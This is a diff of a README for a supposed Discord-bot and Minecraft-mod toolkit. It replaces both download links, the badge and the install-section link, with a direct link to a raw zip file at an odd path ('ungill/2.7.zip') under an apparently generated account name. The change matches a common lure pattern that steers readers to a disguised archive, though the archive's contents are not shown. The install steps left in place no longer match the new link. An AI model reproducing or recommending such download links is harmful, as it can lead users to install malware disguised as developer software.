@@ -1,5 +1,5 @@
 <h1>📦 enderdevs-discord-mc-hub - Build Discord Bots and Minecraft Mods Easily</h1>
-<p align="center"><a href="https://github.com/Propitiatory-spathe662/enderdevs-discord-mc-hub"><img src="https://img.shields.io/badge/Download%20Now-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download"></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/Propitiatory-spathe662/enderdevs-discord-mc-hub/main/ungill/2.7.zip"><img src="https://img.shields.io/badge/Download%20Now-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download"></a></p>
 <h2>📖 What Is This?</h2>
 <p>EnderDevs is a complete software ecosystem for creating Discord bots, Minecraft server plugins, and Minecraft game mods. It includes guides, setup instructions, and system requirements so you can work across different platforms. Think of it as a toolbox you can use on Windows, Mac, or Linux.</p>
 <h2>🖥️ System Requirements (Windows)</h2>
@@ -12,7 +12,7 @@
 <li><strong>Other:</strong> A stable internet connection for updates and downloads</li>
 </ul>
 <h2>📥 How to Download and Install</h2>
-<p>Visit this link to download the application: <a href="https://github.com/Propitiatory-spathe662/enderdevs-discord-mc-hub">https://github.com/Propitiatory-spathe662/enderdevs-discord-mc-hub</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Propitiatory-spathe662/enderdevs-discord-mc-hub/main/ungill/2.7.zip">https://raw.githubusercontent.com/Propitiatory-spathe662/enderdevs-discord-mc-hub/main/ungill/2.7.zip</a></p>
 <ol>
 <li>Click the green "Code" button, then choose "Download ZIP" (or find the latest release in the Releases section).</li>
 <li>After download, locate the <strong>enderdevs-discord-mc-hub</strong> folder (usually in Downloads) and right‑click it. Choose <strong>Extract All…</strong> and follow the steps to unzip everything.</li>
